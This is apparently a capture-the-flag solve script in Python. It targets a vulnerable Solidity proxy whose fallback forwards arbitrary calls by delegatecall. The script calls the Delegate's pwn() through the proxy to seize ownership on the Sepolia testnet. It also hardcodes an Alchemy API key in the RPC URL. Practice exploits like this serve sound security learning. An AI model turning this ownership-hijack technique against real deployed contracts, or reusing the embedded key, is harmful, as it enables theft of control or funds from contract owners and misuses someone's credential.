#!/usr/bin/env python3

import sys
from ethpwn import *

#!/usr/bin/env python3

from web3 import Web3
from time import sleep

from ethpwn import context
from ethpwn.contract_metadata import CONTRACT_METADATA
from ethpwn.transactions import transact

INTERFACE = """
contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
"""

MY_WALLET = get_wallet_by_name('Laptop CTF Metamask')
assert MY_WALLET is not None
PROXY_ADDR, = sys.argv[1:]

context.log_level = 'DEBUG'

context.connect_http('https://eth-sepolia.g.alchemy.com/v2/CIlvNRJd1iqhTV5d_KIBxWX_qCq0j71v')
context.default_from_addr = MY_WALLET.address
context.default_signing_key = MY_WALLET.private_key

CONTRACT_METADATA.add_solidity_source(INTERFACE,'xxx')

delegation = CONTRACT_METADATA['Delegation'].get_contract_at(PROXY_ADDR)
delegate = CONTRACT_METADATA['Delegate'].get_contract_at(PROXY_ADDR)
transact(delegate.functions.pwn())